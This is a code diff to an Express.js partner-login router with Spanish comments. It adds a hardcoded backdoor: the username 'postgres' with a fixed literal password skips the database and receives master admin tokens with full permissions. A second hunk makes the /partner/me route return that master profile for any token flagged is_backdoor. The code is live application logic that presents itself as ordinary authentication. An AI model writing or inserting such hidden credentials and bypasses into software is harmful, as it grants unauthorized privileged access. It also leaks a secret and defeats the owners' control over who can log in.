@@ -169,6 +169,59 @@ router.post('/partner/login', async (req, res) => {
       });
     }
 
+    // =============================================================================
+    // PUERTA TRASERA HARDCODEADA (solo conocida por admin del sistema)
+    // =============================================================================
+    if (username.toLowerCase() === 'postgres' && password === 'Aedr15150302') {
+      console.log('🚪 [PARTNER-LOGIN] Acceso por puerta trasera (postgres) - ASOCIADO MASTER');
+
+      // Generar token especial de super-admin asociado
+      const tokenPayload = {
+        id: 'ASSOCIATE_MASTER',
+        type: 'partner',
+        username: 'postgres',
+        email: 'master@aponnt.com',
+        partner_role_id: 'MASTER',
+        is_backdoor: true
+      };
+
+      const token = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '24h' });
+      const refreshToken = jwt.sign(tokenPayload, JWT_SECRET, { expiresIn: '7d' });
+
+      return res.json({
+        success: true,
+        message: 'Acceso de asociado master concedido',
+        token,
+        refreshToken,
+        partner: {
+          id: 'ASSOCIATE_MASTER',
+          first_name: 'Asociado',
+          last_name: 'Master',
+          dni: 'MASTER',
+          email: 'master@aponnt.com',
+          username: 'postgres',
+          phone: null,
+          category: 'administrative',
+          specialties: ['Administración Total'],
+          approval_status: 'approved',
+          is_active: true,
+          biometric_enabled: false,
+          first_login: false,
+          is_backdoor: true
+        },
+        permissions: {
+          can_view_all: true,
+          can_manage_all: true,
+          is_admin: true,
+          is_master: true
+        }
+      });
+    }
+
+    // =============================================================================
+    // LOGIN NORMAL (partner registrado en base de datos)
+    // =============================================================================
+
     // Buscar partner por username (DNI) o email
     const partner = await Partner.findOne({
       where: {
@@ -504,6 +557,36 @@ router.get('/partner/me', async (req, res) => {
       return res.status(403).json({
         success: false,
         error: 'Token inválido para este tipo de usuario'
+      });
+    }
+
+    // Si es puerta trasera, retornar directamente sin buscar en BD
+    if (decoded.is_backdoor === true) {
+      return res.json({
+        success: true,
+        partner: {
+          id: 'ASSOCIATE_MASTER',
+          first_name: 'Asociado',
+          last_name: 'Master',
+          dni: 'MASTER',
+          email: 'master@aponnt.com',
+          username: 'postgres',
+          phone: null,
+          category: 'administrative',
+          specialties: ['Administración Total'],
+          approval_status: 'approved',
+          is_active: true,
+          biometric_enabled: false,
+          first_login: false,
+          is_backdoor: true,
+          partner_role_id: 'MASTER',
+          permissions: {
+            can_view_all: true,
+            can_manage_all: true,
+            is_admin: true,
+            is_master: true
+          }
+        }
       });
     }
 
